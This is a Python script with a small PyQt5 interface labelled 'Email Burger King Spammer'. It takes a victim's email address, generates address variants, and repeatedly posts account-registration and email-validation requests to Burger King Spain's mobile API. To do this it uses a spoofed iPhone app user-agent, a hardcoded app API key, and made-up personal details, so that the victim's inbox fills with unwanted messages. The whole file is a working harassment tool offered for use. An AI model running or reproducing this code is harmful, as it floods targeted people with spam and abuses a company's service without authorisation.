import requests, sys
import algorithm
from PyQt5.QtWidgets import QApplication, QWidget, QInputDialog, QLineEdit, QLabel

class App(QWidget):

    def __init__(self):
        super().__init__()
        self.title = 'Email Burger King Spammer'
        self.left = 10
        self.top = 10
        self.width = 640
        self.height = 480
        self.initUI()
    
    def initUI(self):
        self.setWindowTitle(self.title)
        self.setGeometry(self.left, self.top, self.width, self.height)
        
        self.getText()
        
        exit()   

    def getText(self):
        email1, okPressed = QInputDialog.getText(self, "Email Burger King Spammer","Email:", QLineEdit.Normal, "")
        if okPressed and email1 != '':
            print(email1)
        
        email = email1.split("@")[0]
    
        mail_list = algorithm.splitter(email)
    
    
        for mail in mail_list:
            make_request(email1)
            try:
                mail = mail + "@" + email1.split("@")[1]
                m = make_request(mail)
                print(m)
            except Exception as e:
                print("[!] Failure")
                print(e) 
                pass


def convert(string):
    list1=[]
    list1[:0]=string
    return list1

url1 = "https://bkmobile.burgerkingencasa.es/bknewuserapp.do"
url2 = "https://bkmobile.burgerkingencasa.es/validateemail.do"

def make_request(mail):
        try:
            headers = {
                "user-agent": "Burger King®/7.0.1 (es.burgerking.burgerking-iphone; build:447; iOS 14.5.1) Alamofire/4.9.1",
                "content-type": "application/x-www-form-urlencoded"}
            params = {
                "apikey": "_bkencasa_0416_",
                "deviceid": "null",
                "email": mail,
                "mbkregister": 1,
                "name": "Elena",
                "news": 0,
                "pass": "DonaldsMome2pene",
                "phone": "643316748",
                "surname": "Penelope",
                "username": mail
            }

            r = requests.post(url1, data=params, headers=headers)

            userOid =r.json()["userOid"]

            params2 = {
                "apikey": "_bkencasa_0416_",
                "newEmail": mail,
                "oldEmail": mail,
                "userOid": userOid
            }

            r2 = requests.post(url2, data=params2, headers=headers)
            return r2.text
        except:
            return(f"[!] Failure")
            
def main():

    email1 = sys.argv[1]
    
    email = email1.split("@")[0]
    
    mail_list = algorithm.splitter(email)
    
    
    for mail in mail_list:
        make_request(email1)
        try:
            mail = mail + "@" + email1.split("@")[1]
            m = make_request(mail)
            print(m)
        except Exception as e:
            print("[!] Failure")
            print(e) 
            pass
    
if __name__ == "__main__":
    
    app = QApplication(sys.argv)
    ex = App()
    sys.exit(app.exec_())

    # main()